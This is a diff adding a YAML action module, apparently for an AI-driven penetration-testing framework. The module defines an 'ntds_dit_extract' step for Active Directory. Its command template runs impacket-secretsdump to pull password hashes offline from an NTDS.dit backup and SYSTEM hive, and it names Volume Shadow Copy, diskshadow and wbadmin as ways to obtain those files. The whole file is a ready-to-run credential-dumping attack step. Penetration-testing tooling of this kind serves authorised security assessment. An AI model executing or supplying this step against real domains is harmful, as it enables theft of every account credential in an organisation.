@@ -1,0 +1,17 @@
+name: ntds_dit_extract
+category: ad
+description: NTDS.dit offline extraction
+preconditions:
+  - os==windows
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Offline hash extraction from NTDS.dit backup. Obtain via: Volume Shadow Copy, diskshadow, wbadmin. Parse with secretsdump LOCAL mode."
